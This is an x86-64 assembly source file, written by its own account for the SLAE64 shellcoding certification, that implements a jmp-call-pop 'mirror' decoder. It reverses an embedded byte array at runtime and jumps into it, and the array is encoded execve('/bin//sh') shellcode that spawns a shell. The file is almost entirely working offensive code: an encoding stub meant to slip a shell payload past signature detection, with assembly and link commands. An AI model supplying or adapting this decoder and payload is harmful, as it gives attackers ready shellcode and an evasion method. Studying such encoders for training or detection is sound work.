; This shellcode decoder has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification :
; http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
;
; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; $ nasm -f elf64 Mirror-Decoder.jump_call_pop.nasm -o Mirror-Decoder.jump_call_pop.o
; $ ld Mirror-Decoder.jump_call_pop.o -o Mirror-Decoder.jump_call_pop

global _start

section .text   
_start:	
        jmp ONSTACK   
GO_LOOP:
        pop r8                       ; r8 is the SC address. pop esi crash ?;
	xor rcx, rcx                 ; offset to first SC byte
	mov rdx, SC_SIZE - 1         ; offset to last SC byte = SC length -1         
	mov r9, SC_SIZE		     ; r9 = SC_SIZE / 2
	shr r9, 1
LOOP:
	cmp rcx, r9                  ; SC length / 2 - stop swapping bytes when we are in the middle
	je SC                        ; go to decoded shell code
	
	mov al, byte [r8+rcx]        ; save values
	mov bl, byte [r8+rdx]

	mov byte [r8+rcx], bl        ; swap values
	mov byte [r8+rdx], al
  
	inc rcx                      ; go to next byte from left to right
	dec rdx                      ; go to next byte from right to left
        jmp LOOP                 
section .data
ONSTACK:
	call GO_LOOP
SC:	db 0x05,0x0f,0x3b,0xc0,0x83,0x48,0xe6,0x89,0x48,0x57,0xe2,0x89,0x48,0x50,0xe7,0x89,0x48,0x53,0x68,0x73,0x2f,0x2f,0x6e,0x69,0x62,0x2f,0xbb,0x48,0x50,0xc0,0x31,0x48
SC_SIZE equ $ - SC
